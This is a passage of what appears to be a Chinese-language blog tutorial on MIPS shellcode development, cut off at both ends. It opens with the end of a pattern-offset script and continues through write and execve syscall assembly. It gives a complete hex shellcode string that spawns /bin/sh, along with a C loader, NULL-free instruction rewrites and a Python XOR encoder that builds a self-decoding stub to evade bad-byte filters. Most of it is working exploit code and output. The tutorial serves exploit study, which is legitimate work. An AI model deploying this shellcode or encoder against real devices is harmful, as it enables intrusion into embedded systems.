class="line">                        action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;output file name&#x27;</span>,\</span><br><span class="line">                        default=<span class="string">&#x27;patternShell.txt&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--length&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;length of pattern code&#x27;</span>,\</span><br><span class="line">                        <span class="built_in">type</span>=<span class="built_in">int</span>,default=<span class="number">1024</span>)</span><br><span class="line">    <span class="comment">#parser.add_argument(&#x27;-v&#x27;, dest=&#x27;verbose&#x27;, action=&#x27;store_true&#x27;)</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## save all argument</span></span><br><span class="line">    length = args.length</span><br><span class="line">    output = args.file</span><br><span class="line">    <span class="comment">#verbose = args.verbose</span></span><br><span class="line">    createCode = args.create</span><br><span class="line">    searchCode = args.search</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> createCode <span class="keyword">and</span> (<span class="number">0</span> &lt; args.length &lt;= <span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">        <span class="comment">#eg:  -c -l 90</span></span><br><span class="line">        generate(length,output)</span><br><span class="line">    <span class="keyword">elif</span> searchCode <span class="keyword">and</span> (<span class="number">0</span> &lt; args.length &lt;= <span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">        <span class="comment">#eg: -s 0x474230141</span></span><br><span class="line">        patternMatch(searchCode,length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] You shoud chices from [-c -s]&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Pattern length must be less than 6760&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;more help: pattern.py -h&#x27;</span>)</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="基于MIPS的Shellcode开发"><a href="#基于MIPS的Shellcode开发" class="headerlink" title="基于MIPS的Shellcode开发"></a>基于MIPS的Shellcode开发</h2><h3 id="MIPS-Linux系统调用"><a href="#MIPS-Linux系统调用" class="headerlink" title="MIPS Linux系统调用"></a>MIPS Linux系统调用</h3><p>syscall的调用方法:  <code>$v0</code>保存需要执行的系统调用的编号</p><p>伪代码<code>syscall($v0, $a0, $a1, $a2....)</code></p><p>源码 <strong>exit</strong>系统调用**exit(code)**的例子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">li $a0, 0 # code</span><br><span class="line">li $v0, 4001 # exit系统调用号</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h3 id="write系统调用"><a href="#write系统调用" class="headerlink" title="write系统调用"></a>write系统调用</h3><p><strong>C语言代码:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *pstr = <span class="string">&quot;ABC\n&quot;</span>;</span><br><span class="line">    write(<span class="number">1</span>, pstr, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>汇编代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global __start</span><br><span class="line">.set noreorder</span><br><span class="line"></span><br><span class="line">__start:</span><br><span class="line">addiu $sp, $sp, -32</span><br><span class="line">lui $t6, 0x4142</span><br><span class="line">ori $t6, $t6, 0x430a</span><br><span class="line">sw $t6, 0($sp)</span><br><span class="line">li $a0, 1</span><br><span class="line">addiu $a1, $sp, 0</span><br><span class="line">li $a2, 5</span><br><span class="line">li $v0, 4004</span><br><span class="line">syscall</span><br><span class="line">li $a0, 0</span><br><span class="line">li $v0, 4001</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><strong>MIPS编译脚本 nasm.sh</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/zsh</span></span><br><span class="line"><span class="comment"># $ zsh nasm.sh &lt;source file&gt; &lt;excute file&gt;</span></span><br><span class="line">src=<span class="variable">$1</span></span><br><span class="line">dst=<span class="variable">$2</span></span><br><span class="line">mips-linux-gnu-as <span class="variable">$src</span> -o a.o</span><br><span class="line">mips-linux-gnu-ld a.o -o <span class="variable">$dst</span></span><br><span class="line">rm a.o</span><br></pre></td></tr></table></figure><p>编译运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  write_syscall zsh nasm.sh write.s write</span><br><span class="line">➜  write_syscall qemu-mips write</span><br><span class="line">ABC</span><br><span class="line">qemu: uncaught target signal 4 (Illegal instruction) - core dumped</span><br><span class="line">[1]    11304 illegal hardware instruction  qemu-mips write</span><br></pre></td></tr></table></figure><p>加以改进</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global __start</span><br><span class="line">.set noreorder</span><br><span class="line"></span><br><span class="line">__start:</span><br><span class="line">addiu $sp, $sp, -32</span><br><span class="line">lui $t6, 0x4142</span><br><span class="line">ori $t6, $t6, 0x430a</span><br><span class="line">sw $t6, 0($sp)</span><br><span class="line">li $a0, 1</span><br><span class="line">addiu $a1, $sp, 0</span><br><span class="line">li $a2, 5</span><br><span class="line">li $v0, 4004</span><br><span class="line">syscall</span><br><span class="line">li $a0, 0 # code</span><br><span class="line">li $v0, 4001 # exit系统调用号</span><br><span class="line">syscall # 调用exit(0)</span><br></pre></td></tr></table></figure><p>编译运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  write_syscall zsh nasm.sh write.s write</span><br><span class="line">➜  write_syscall qemu-mips write</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure><h3 id="execve系统调用"><a href="#execve系统调用" class="headerlink" title="execve系统调用"></a>execve系统调用</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *<span class="keyword">const</span> argv[]. <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure><p><strong>C 语言中完整execve系统调用代码</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *program = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *arg = <span class="string">&quot;-1&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *args[<span class="number">3</span>];</span><br><span class="line">args[<span class="number">0</span>] = program;</span><br><span class="line">args[<span class="number">1</span>] = arg;</span><br><span class="line">args[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">execve(program, args, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>C语言 execve(“/bin/sh”)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>execve 执行/bin/sh汇编代码</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line"></span><br><span class="line">__start:</span><br><span class="line">li $a2,0x111</span><br><span class="line">p:bltzal $a2,p</span><br><span class="line">li $a2,0</span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">addiu $a0,$ra,28</span><br><span class="line">sw $a0,-24($sp)</span><br><span class="line">sw $zero,-20($sp)</span><br><span class="line">addiu $a1,$sp,-24</span><br><span class="line">li $v0,4011</span><br><span class="line">syscall</span><br><span class="line">sc:</span><br><span class="line">    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span><br></pre></td></tr></table></figure><p>编译运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  shellcode zsh nasm.sh execve.S execve</span><br><span class="line">➜  shellcode qemu-mips execve</span><br><span class="line">$ ls</span><br><span class="line">execve  execve.S  nasm.sh</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p><strong>execve 执行/bin/sh的汇编代码</strong></p><p>可以通过pwntools获得机器码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">li $a2,0x111</span></span><br><span class="line"><span class="string">p:bltzal $a2,p</span></span><br><span class="line"><span class="string">li $a2,0</span></span><br><span class="line"><span class="string">addiu $sp,$sp,-32</span></span><br><span class="line"><span class="string">addiu $a0,$ra,28</span></span><br><span class="line"><span class="string">sw $a0,-24($sp)</span></span><br><span class="line"><span class="string">sw $zero,-20($sp)</span></span><br><span class="line"><span class="string">addiu $a1,$sp,-24</span></span><br><span class="line"><span class="string">li $v0,4011</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string">sc:</span></span><br><span class="line"><span class="string">    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shellcode:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\\x<span class="subst">&#123;<span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>&quot;</span>, end =<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>则有</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> *shellcode = <span class="string">&quot;\x24\x06\x01\x11\x04\xd0\xff\xff\x24\x06\x00\x00\x27\xbd\xff\xe0\x27\xe4\x00\x1c\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x00\x00\x00\x0c\x2f\x62\x69\x6e\x2f\x73\x68&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> (*s)() = (<span class="keyword">char</span>(*)())shellcode;</span><br><span class="line">    s();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  shellcode mips-linux-gnu-gcc execve.c -o execve</span><br><span class="line">➜  shellcode qemu-mips execve</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">execve  execve.S  execve.c  exp.py  nasm.sh</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h3 id="Shellcode-编码优化"><a href="#Shellcode-编码优化" class="headerlink" title="Shellcode 编码优化"></a>Shellcode 编码优化</h3><h4 id="指令优化"><a href="#指令优化" class="headerlink" title="指令优化"></a>指令优化</h4><ul><li>避免出现坏字符<ul><li>例如： NULL</li></ul></li></ul><table><thead><tr><th>普通指令</th><th>机器码</th><th>无NULLL指令</th><th>机器码</th></tr></thead><tbody><tr><td>li $a2, 0</td><td>24 06 00 00</td><td>slti $a2, $zero, -1</td><td>28 06 ff ff</td></tr><tr><td>li $a2, 1</td><td>24 04 00 01</td><td>slti $a2, $zero, -1</td><td>2c 04 ff ff</td></tr><tr><td>addiu $a0, $ra, 32</td><td>24 e4 00 20</td><td>addiu $a0, $ra, 4097</td><td>27 e4 10 01</td></tr><tr><td></td><td></td><td>addiu $a0, $a0, -4065</td><td>24 84 f0 1f</td></tr><tr><td>li $a2, 5</td><td>24 06 00 05</td><td>li $t6, -9</td><td>24 0e ff f7</td></tr><tr><td></td><td></td><td>nor $t6, $t6, $zero</td><td>01 c0 70 27</td></tr><tr><td></td><td></td><td>addi $a2, $t6, -3</td><td>21 c6 ff fd</td></tr></tbody></table><p><strong>无NULL的write系统调用 Shellcode</strong></p><p>汇编代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sltiu $a0,$zero,-1</span><br><span class="line">lui $t6,0x4142</span><br><span class="line">ori $t6,$t6,0x430a</span><br><span class="line">sw $t6,-24($sp)</span><br><span class="line">sw $zero,-20($sp)</span><br><span class="line">addiu $a1,$sp,-24</span><br><span class="line">li $t7,-9</span><br><span class="line">nor $t7,$t7,$zero</span><br><span class="line">addi $a2,$t7,-3</span><br><span class="line">li $v0,4004</span><br><span class="line">syscall 0x40404</span><br></pre></td></tr></table></figure><p>获得机器码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sltiu $a0,$zero,-1</span></span><br><span class="line"><span class="string">lui $t6,0x4142</span></span><br><span class="line"><span class="string">ori $t6,$t6,0x430a</span></span><br><span class="line"><span class="string">sw $t6,-24($sp)</span></span><br><span class="line"><span class="string">sw $zero,-20($sp)</span></span><br><span class="line"><span class="string">addiu $a1,$sp,-24</span></span><br><span class="line"><span class="string">li $t7,-9</span></span><br><span class="line"><span class="string">nor $t7,$t7,$zero</span></span><br><span class="line"><span class="string">addi $a2,$t7,-3</span></span><br><span class="line"><span class="string">li $v0,4004</span></span><br><span class="line"><span class="string">syscall 0x40404</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shellcode:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\\x<span class="subst">&#123;<span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>&quot;</span>, end =<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>则有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x2c\x04\xff\xff sltiu $a0,$zero,-1</span><br><span class="line">\x3c\x0e\x41\x42 lui $t6,0x4142</span><br><span class="line">\x35\xce\x43\x0a ori $t6,$t6,0x430a</span><br><span class="line">\xaf\xae\xff\xe8 sw $t6,-24($sp)</span><br><span class="line">\xaf\xa0\xff\xec sw $zero,-20($sp)</span><br><span class="line">\x27\xa5\xff\xe8 addiu $a1,$sp,-24</span><br><span class="line">\x24\x0f\xff\xf7 li $t7,-9</span><br><span class="line">\x01\xe0\x78\x27 nor $t7,$t7,$zero</span><br><span class="line">\x21\xe6\xff\xfd addi $a2,$t7,-3</span><br><span class="line">\x24\x02\x0f\xa4 li $v0,4004</span><br><span class="line">\x01\x01\x01\x0c syscall 0x40404</span><br></pre></td></tr></table></figure><ul><li><code>sltiu $a0,$zero,-1</code>, 将数字1写入<code>$a0</code>, 避免出现<code>NULL</code>字符</li><li>第7行~第11行： 使用3条与赋值、运算相关的指令，避免出现<code>NULL</code>字节，同时实现与运行<code>li $a2, 5</code>命令相同的效果</li></ul><p><strong>无NULL的execve系统调用Shellcode</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">li $a2,1638</span><br><span class="line">p:bltzal $a2,p</span><br><span class="line">slti $a2,$zero,-1</span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">addiu $a0,$ra,4097</span><br><span class="line">addiu $a0,$a0,-4065</span><br><span class="line">sw $a0,-24($sp)</span><br><span class="line">sw $zero,-20($sp)</span><br><span class="line">addiu $a1,$sp,-24</span><br><span class="line">li $v0,4011</span><br><span class="line">syscall 0x40404</span><br><span class="line">sc:</span><br><span class="line">    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span><br></pre></td></tr></table></figure><h4 id="Shellcode-编码"><a href="#Shellcode-编码" class="headerlink" title="Shellcode 编码"></a>Shellcode 编码</h4><p>避开可能的限制字符0x0D(\r), 0x0A(\n) 或 0x20(Space), 或限制必须为可见字符(ASCII值) 或Unicode值</p><ul><li>Base64</li><li>alpha_uppper<ul><li>编码后使其呈现ASCII可见字符编码</li></ul></li><li>xor编码</li></ul><h5 id="Xor编码实现"><a href="#Xor编码实现" class="headerlink" title="Xor编码实现"></a>Xor编码实现</h5><p><strong>encoder.py</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## encoder: long_xor</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"></span><br><span class="line">bad_bytes = [<span class="number">0</span>]*<span class="number">257</span></span><br><span class="line">good_bytes = []</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key can&#x27;t in user_bad_bytes</span></span><br><span class="line"><span class="string">slen can&#x27;t contain user_bad_bytes</span></span><br><span class="line"><span class="string">encoder can&#x27;t contain user_bad_bytes</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">header</span>(<span class="params">slen, key, bad_bytes</span>):</span></span><br><span class="line">    encoder = <span class="string">b&quot;\x24\x18\xf9\x9a&quot;</span>  <span class="comment"># li $t8, -0x666</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x07\x10\xff\xff&quot;</span>  <span class="comment"># p:  bltzal $t8, p</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x28\x18\xff\xff&quot;</span>  <span class="comment"># slti $t8, $zero, -1</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x27\xe8\x10\x01&quot;</span>  <span class="comment"># addu $t0, $ra, 4097</span></span><br><span class="line">    <span class="comment"># addu $t0, $t0, -4097+44+len+1</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x25\x08&quot;</span>+struct.pack(<span class="string">&quot;&gt;h&quot;</span>, slen)</span><br><span class="line">    <span class="comment"># lui $t1, 0xXXXX(high)</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x3c\x09&quot;</span>+struct.pack(<span class="string">&quot;&gt;BB&quot;</span>, key[<span class="number">0</span>], key[<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># ori $t1, $t1, 0xXXXX(low)</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x35\x29&quot;</span>+struct.pack(<span class="string">&quot;&gt;BB&quot;</span>, key[<span class="number">2</span>], key[<span class="number">3</span>])</span><br><span class="line">    encoder += <span class="string">b&quot;\x3c\x0b\x01\xe0&quot;</span>  <span class="comment"># lui $t3, 0x01e0</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x35\x6b\x78\x27&quot;</span>  <span class="comment"># ori $t3, $t3, 0x7827</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x8d\x0e\xff\xff&quot;</span>  <span class="comment"># x:  lw $t6, -1($t0)</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x01\xc9\x60\x26&quot;</span>  <span class="comment"># xor $t4, $t6, $t1</span></span><br><span class="line">    encoder += <span class="string">b&quot;\xad\x0c\xff\xff&quot;</span>  <span class="comment"># sw $t4, -1($t0)</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x25\x08\xff\xfc&quot;</span>  <span class="comment"># addu $t0, $t0, -4</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x15\xcb\xff\xfb&quot;</span>  <span class="comment"># bne $t6, $t3, -20</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x01\xe0\x78\x27&quot;</span>  <span class="comment"># nor $t7, $t7, $zero</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> dt <span class="keyword">in</span> bad_bytes:</span><br><span class="line">        <span class="keyword">if</span> encoder.find(dt) &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Encode failed!&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] contain bad bytes: &#x27;</span>, <span class="built_in">hex</span>(dt))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] You need a new head of decoder!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> encoder</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_c_format</span>(<span class="params">data</span>):</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    line = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> dt <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">0</span> <span class="keyword">and</span> count % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&quot;%s&quot;&#x27;</span> % line)</span><br><span class="line">            line = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        line += <span class="string">&quot;\\x%02x&quot;</span> % dt</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&quot;%s&quot;&#x27;</span> % line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XOR_ENCODER</span>(<span class="params">shellcode, xor_with</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    @ xor_with = (A,B)</span></span><br><span class="line"><span class="string">    long_key = ABAB</span></span><br><span class="line"><span class="string">    long_shell = 1234</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    slong_key = struct.pack(</span><br><span class="line">        <span class="string">&quot;BBBB&quot;</span>, xor_with[<span class="number">0</span>], xor_with[<span class="number">1</span>], xor_with[<span class="number">2</span>], xor_with[<span class="number">3</span>])</span><br><span class="line">    long_key = struct.unpack(<span class="string">&quot;&gt;L&quot;</span>, slong_key)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode)//<span class="number">4</span>):</span><br><span class="line">        code = struct.unpack(<span class="string">&quot;&gt;L&quot;</span>, shellcode[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print hex(code),i</span></span><br><span class="line">        code = code ^ long_key</span><br><span class="line">        data += struct.pack(<span class="string">&quot;&gt;L&quot;</span>, code)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key</span>(<span class="params">shellcode, user_bad_bytes</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    @ key can&#x27;t contain in user_bad_bytes</span></span><br><span class="line"><span class="string">    @ because key will write in the head of decoder </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> dt <span class="keyword">in</span> shellcode:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> i ^ dt <span class="keyword">in</span> user_bad_bytes \</span><br><span class="line">               <span class="keyword">or</span> i <span class="keyword">in</span> user_bad_bytes:</span><br><span class="line">                bad_bytes[i] = i</span><br><span class="line">    <span class="comment"># print bad_bytes</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> bad_bytes[i] == <span class="number">0</span>:</span><br><span class="line">            good_bytes.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print good_bytes</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        key.append(random.choice(good_bytes))</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span>():</span></span><br><span class="line">    exe_name = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Usage:&#x27;</span>, exe_name, <span class="string">&#x27;[source] [bad bytes]&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\tsource\t\t: source of shellcode byte file&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\tbad bytes\t: bad bytes to encoder&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encoder</span>(<span class="params">srcfile, user_bad_bytes</span>):</span></span><br><span class="line">    fr = <span class="built_in">open</span>(srcfile, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    shellcode = fr.read()  <span class="comment"># source of shellcode data</span></span><br><span class="line">    fr.close()</span><br><span class="line">    slen = <span class="built_in">len</span>(shellcode)  <span class="comment"># shellcode len</span></span><br><span class="line">    padslen = -<span class="number">4097</span> + <span class="number">44</span> + slen + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check head of decoder</span></span><br><span class="line">    code = struct.pack(<span class="string">&quot;&gt;h&quot;</span>, padslen)</span><br><span class="line">    codeH = code[<span class="number">0</span>]</span><br><span class="line">    codeL = code[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> codeH <span class="keyword">in</span> user_bad_bytes <span class="keyword">or</span>\</span><br><span class="line">       codeL <span class="keyword">in</span> user_bad_bytes:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Shellcode Length(0x%x,0x%x) contain user_bad_bytes !&#x27;</span> %</span><br><span class="line">              (codeH, codeL))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Check &amp; Padding Shellcode!&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    xor_with = generate_key(shellcode, user_bad_bytes)</span><br><span class="line">    <span class="comment"># print xor_with</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[t] encoder: long_xor&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n[x] Choose to XOR with [ %s,%s,%s,%s ]&#x27;</span></span><br><span class="line">          % (<span class="built_in">hex</span>(xor_with[<span class="number">0</span>]), <span class="built_in">hex</span>(xor_with[<span class="number">1</span>]), <span class="built_in">hex</span>(xor_with[<span class="number">2</span>]), <span class="built_in">hex</span>(xor_with[<span class="number">3</span>])))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[S] Shellcode: \n&#x27;</span>)</span><br><span class="line">    <span class="comment"># print xor_with</span></span><br><span class="line"></span><br><span class="line">    head = header(padslen, xor_with, user_bad_bytes)</span><br><span class="line">    <span class="keyword">if</span> head:</span><br><span class="line">        shell = XOR_ENCODER(shellcode, xor_with)</span><br><span class="line">        print_c_format(head+shell)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">        usage()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] start encoder ...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        srcfile = <span class="string">&#x27;sc.bin&#x27;</span></span><br><span class="line">        user_bad_bytes = [<span class="number">0x00</span>, <span class="number">0x0d</span>, <span 